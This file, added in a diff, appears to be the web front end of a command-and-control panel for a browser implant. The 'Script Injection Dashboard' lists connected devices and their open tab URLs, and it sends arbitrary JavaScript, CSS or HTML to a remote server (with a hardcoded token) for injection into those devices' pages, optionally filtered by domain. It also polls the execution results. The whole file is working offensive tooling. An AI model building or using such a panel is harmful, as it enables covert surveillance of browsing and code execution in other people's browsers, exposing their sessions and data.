@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Script Injection Dashboard</title>
+<style>
+  :root {
+    --bg: #f0f0f0;
+    --fg: #222;
+    --accent: #0055cc;
+    --accent-dark: #003d99;
+    --danger: #cc3300;
+  }
+  [data-theme="dark"] {
+    --bg: #121212;
+    --fg: #eee;
+    --accent: #3399ff;
+    --accent-dark: #0066ff;
+    --danger: #ff6666;
+  }
+  body {
+    margin:0; padding:0;
+    font-family: Arial, sans-serif;
+    background: var(--bg);
+    color: var(--fg);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+  header {
+    background: var(--accent);
+    color: white;
+    padding: 1rem;
+    font-size: 1.25rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  main {
+    flex-grow: 1;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 1rem;
+    padding: 1rem;
+  }
+  section {
+    background: white;
+    border-radius: 8px;
+    padding: 1rem;
+    box-shadow: 0 0 8px rgba(0,0,0,0.1);
+    flex: 1 1 320px;
+    max-height: 80vh;
+    overflow-y: auto;
+  }
+  [data-theme="dark"] section {
+    background: #222;
+    box-shadow: 0 0 8px rgba(255,255,255,0.1);
+  }
+  button {
+    background: var(--accent);
+    border: none;
+    color: white;
+    padding: 0.4rem 0.8rem;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 1rem;
+    margin-top: 0.5rem;
+  }
+  button:disabled {
+    background: gray;
+    cursor: default;
+  }
+  textarea, input[type="text"] {
+    width: 100%;
+    font-family: monospace;
+    font-size: 0.9rem;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    resize: vertical;
+    background: var(--bg);
+    color: var(--fg);
+    padding: 0.5rem;
+    margin-top: 0.3rem;
+    box-sizing: border-box;
+  }
+  input[type="text"] {
+    height: 30px;
+  }
+  ul {
+    list-style: none;
+    padding-left: 0;
+  }
+  li {
+    margin-bottom: 0.5rem;
+    border-bottom: 1px solid #ddd;
+    padding-bottom: 0.3rem;
+  }
+  [data-theme="dark"] li {
+    border-bottom: 1px solid #444;
+  }
+  .device-online {
+    color: green;
+  }
+  .device-offline {
+    color: var(--danger);
+  }
+  .log-entry {
+    font-size: 0.85rem;
+    border-bottom: 1px solid #ddd;
+    padding: 0.3rem 0;
+  }
+  [data-theme="dark"] .log-entry {
+    border-color: #444;
+  }
+  .flex-row {
+    display: flex;
+    gap: 0.5rem;
+    align-items: center;
+  }
+  .flex-grow {
+    flex-grow: 1;
+  }
+  .tabs-list {
+    margin-top: 0.5rem;
+    font-size: 0.85rem;
+  }
+  .tabs-list li {
+    margin-bottom: 0.2rem;
+    word-break: break-all;
+  }
+  .renameBtn {
+    margin-left: auto;
+    background: var(--accent-dark);
+    padding: 0.2rem 0.6rem;
+  }
+  @media (max-width: 700px) {
+    main {
+      flex-direction: column;
+    }
+  }
+</style>
+</head>
+<body>
+<header>
+  <div>Script Injection Dashboard</div>
+  <button id="toggleThemeBtn">Dark Mode</button>
+</header>
+<main>
+  <section id="devicesSection">
+    <h2>Devices</h2>
+    <ul id="devicesList"></ul>
+  </section>
+  <section id="jobsSection">
+    <h2>Jobs</h2>
+    <ul id="jobsList"></ul>
+    <hr/>
+    <h3>Send Custom Script</h3>
+    <label>
+      Injection Method:
+      <select id="customMethodSelect">
+        <option value="executeScript">executeScript</option>
+        <option value="blobScript">blobScript</option>
+        <option value="domInjection">domInjection</option>
+        <option value="insertCSS">insertCSS</option>
+        <option value="blobStyle">blobStyle</option>
+        <option value="domHTML">domHTML</option>
+      </select>
+    </label>
+    <label>
+      Script Code (JS/CSS/HTML):
+      <textarea id="customScriptArea" placeholder="Paste JS/CSS/HTML here..."></textarea>
+    </label>
+    <label>
+      Target Device IDs (comma separated):
+      <input id="customTargetDevices" type="text" placeholder="e.g. 657cb478-1043-428c-9478-7f5344f837d9" />
+    </label>
+    <label>
+      Target Domains (comma separated, leave blank for no filter):
+      <input id="customTargetDomains" type="text" placeholder="e.g. http://httpforever.com, https://example.com" />
+    </label>
+    <button id="sendCustomBtn">Send Script</button>
+  </section>
+  <section id="logSection">
+    <h2>Execution Log</h2>
+    <div id="logList"></div>
+  </section>
+</main>
+
+<script>
+  const API_BASE = 'https://cookie-null-server.onrender.com';
+  const AUTH_TOKEN = 'abc123456789';
+
+  const devicesList = document.getElementById('devicesList');
+  const jobsList = document.getElementById('jobsList');
+  const logList = document.getElementById('logList');
+  const customScriptArea = document.getElementById('customScriptArea');
+  const customMethodSelect = document.getElementById('customMethodSelect');
+  const customTargetDevices = document.getElementById('customTargetDevices');
+  const customTargetDomains = document.getElementById('customTargetDomains');
+  const sendCustomBtn = document.getElementById('sendCustomBtn');
+  const toggleThemeBtn = document.getElementById('toggleThemeBtn');
+
+  let devices = {};
+  let jobs = [];
+  let logs = [];
+
+  // Dark mode toggle and persistence
+  function loadTheme() {
+    if(localStorage.getItem('darkMode') === 'true') {
+      document.documentElement.setAttribute('data-theme', 'dark');
+      toggleThemeBtn.textContent = 'Light Mode';
+    }
+  }
+  function toggleTheme() {
+    if(document.documentElement.getAttribute('data-theme') === 'dark') {
+      document.documentElement.removeAttribute('data-theme');
+      localStorage.setItem('darkMode', 'false');
+      toggleThemeBtn.textContent = 'Dark Mode';
+    } else {
+      document.documentElement.setAttribute('data-theme', 'dark');
+      localStorage.setItem('darkMode', 'true');
+      toggleThemeBtn.textContent = 'Light Mode';
+    }
+  }
+  toggleThemeBtn.onclick = toggleTheme;
+  loadTheme();
+
+  // Helper: format timestamp nicely
+  function formatLastSeen(ts) {
+    const diff = Date.now() - ts;
+    if (diff < 60000) return 'just now';
+    if (diff < 3600000) return Math.floor(diff/60000) + 'm ago';
+    if (diff < 86400000) return Math.floor(diff/3600000) + 'h ago';
+    const d = new Date(ts);
+    return d.toLocaleString();
+  }
+
+  // Fetch devices from server
+  async function fetchDevices() {
+    try {
+      const res = await fetch(API_BASE + '/devices', {
+        headers: { 'X-Auth-Token': AUTH_TOKEN }
+      });
+      if(!res.ok) throw new Error('Failed to fetch devices');
+      devices = await res.json();
+      renderDevices();
+    } catch(e) {
+      alert('Error fetching devices: ' + e.message);
+    }
+  }
+
+  // Render devices list with expandable tabs and last seen
+  function renderDevices() {
+    devicesList.innerHTML = '';
+    for(const [id, device] of Object.entries(devices)) {
+      const online = (Date.now() - device.lastSeen) < 2 * 60 * 1000; // last seen less than 2 minutes ago
+      const li = document.createElement('li');
+      li.innerHTML = `
+        <div class="flex-row" style="cursor:pointer;">
+          <b>${device.name || 'Unnamed Device'}</b> 
+          <span>(${id})</span>
+          <span class="${online ? 'device-online' : 'device-offline'}" style="margin-left: auto;">
+            ${online ? 'Online' : 'Offline'} • Last seen: ${formatLastSeen(device.lastSeen)}
+          </span>
+          <button data-id="${id}" class="renameBtn">Rename</button>
+        </div>
+        <ul class="tabs-list" style="display:none;"></ul>
+      `;
+      devicesList.appendChild(li);
+
+      const headerDiv = li.querySelector('.flex-row');
+      const tabsList = li.querySelector('.tabs-list');
+      headerDiv.onclick = () => {
+        tabsList.style.display = tabsList.style.display === 'none' ? 'block' : 'none';
+        if (tabsList.style.display === 'block') {
+          // Render tabs
+          tabsList.innerHTML = '';
+          for (const tab of device.tabs || []) {
+            const tabLi = document.createElement('li');
+            tabLi.textContent = `${tab.tabId}: ${tab.url}`;
+            tabsList.appendChild(tabLi);
+          }
+        }
+      };
+    }
+    // Rename buttons
+    document.querySelectorAll('.renameBtn').forEach(btn => {
+      btn.onclick = async (e) => {
+        e.stopPropagation();
+        const id = btn.dataset.id;
+        const newName = prompt('Enter new device name:', devices[id].name || '');
+        if(newName) {
+          await fetch(API_BASE + '/name-device', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'X-Auth-Token': AUTH_TOKEN
+            },
+            body: JSON.stringify({ deviceId: id, name: newName })
+          });
+          await fetchDevices();
+        }
+      };
+    });
+  }
+
+  // Fetch jobs from server
+  async function fetchJobs() {
+    try {
+      const res = await fetch(API_BASE + '/jobs', {
+        headers: { 'X-Auth-Token': AUTH_TOKEN }
+      });
+      if(!res.ok) throw new Error('Failed to fetch jobs');
+      jobs = await res.json();
+      renderJobs();
+    } catch(e) {
+      alert('Error fetching jobs: ' + e.message);
+    }
+  }
+
+  // Render jobs list with remove button
+  function renderJobs() {
+    jobsList.innerHTML = '';
+    for(const job of jobs) {
+      const li = document.createElement('li');
+      li.innerHTML = `
+        <b>ID:</b> ${job.id}<br/>
+        <b>Method:</b> ${job.method}<br/>
+        <b>Targets:</b> ${job.targets.join(', ')}<br/>
+        <b>Target Domains:</b> ${job.targetDomain || '(none)'}<br/>
+        <button data-id="${job.id}" class="removeJobBtn">Remove</button>
+      `;
+      jobsList.appendChild(li);
+    }
+    document.querySelectorAll('.removeJobBtn').forEach(btn => {
+      btn.onclick = async () => {
+        const id = btn.dataset.id;
+        if(confirm('Remove job ' + id + '?')) {
+          await fetch(API_BASE + '/remove', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'X-Auth-Token': AUTH_TOKEN
+            },
+            body: JSON.stringify({ jobId: id })
+          });
+          await fetchJobs();
+        }
+      };
+    });
+  }
+
+  // Fetch execution logs/pings
+  async function fetchLogs() {
+    try {
+      const res = await fetch(API_BASE + '/pings', {
+        headers: { 'X-Auth-Token': AUTH_TOKEN }
+      });
+      if(!res.ok) throw new Error('Failed to fetch logs');
+      logs = await res.json();
+      renderLogs();
+    } catch(e) {
+      alert('Error fetching logs: ' + e.message);
+    }
+  }
+
+  // Render logs with success/error styling
+ function renderLogs() {
+  logList.innerHTML = '';
+  for (const entry of logs.slice(-50).reverse()) {
+    const div = document.createElement('div');
+    div.className = 'log-entry';
+    div.style.color = (entry.status && entry.status.toLowerCase().includes('error')) ? 'var(--danger)' : 'inherit';
+
+    // Lookup device name or fallback to deviceId
+    const deviceData = devices[entry.deviceId];
+    const deviceDisplay = deviceData ? (deviceData.name || 'Unnamed Device') : entry.deviceId;
+
+    div.textContent = `[${new Date(entry.time).toLocaleTimeString()}] Device: ${deviceDisplay} | Job: ${entry.jobId} | Tab: ${entry.tabId} | Status: ${entry.status} | Result: ${entry.result || '-'}`;
+    logList.appendChild(div);
+  }
+}
+
+
+  // Send custom script button handler
+  sendCustomBtn.onclick = async () => {
+    const code = customScriptArea.value.trim();
+    const method = customMethodSelect.value;
+    const targetsRaw = customTargetDevices.value.trim();
+    const domainsRaw = customTargetDomains.value.trim();
+
+    if (!code) {
+      alert('Please enter script code');
+      return;
+    }
+    if (!targetsRaw) {
+      alert('Please enter at least one target device ID');
+      return;
+    }
+
+    const targets = targetsRaw.split(',').map(s => s.trim()).filter(Boolean);
+    const targetDomain = domainsRaw.split(',').map(s => s.trim()).filter(Boolean).join(',');
+
+    try {
+      const res = await fetch(API_BASE + '/send', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Auth-Token': AUTH_TOKEN
+        },
+        body: JSON.stringify({
+          code,
+          method,
+          targets,
+          targetDomain
+        })
+      });
+      if(!res.ok) throw new Error('Failed to send script');
+      alert('Script sent successfully');
+      customScriptArea.value = '';
+      customTargetDevices.value = '';
+      customTargetDomains.value = '';
+      await fetchJobs();
+    } catch(e) {
+      alert('Error sending script: ' + e.message);
+    }
+  };
+
+  // Initial load
+  fetchDevices();
+  fetchJobs();
+  fetchLogs();
+
+  // Poll logs every 5 seconds
+  setInterval(fetchLogs, 5000);
+</script>
+</body>
+</html>
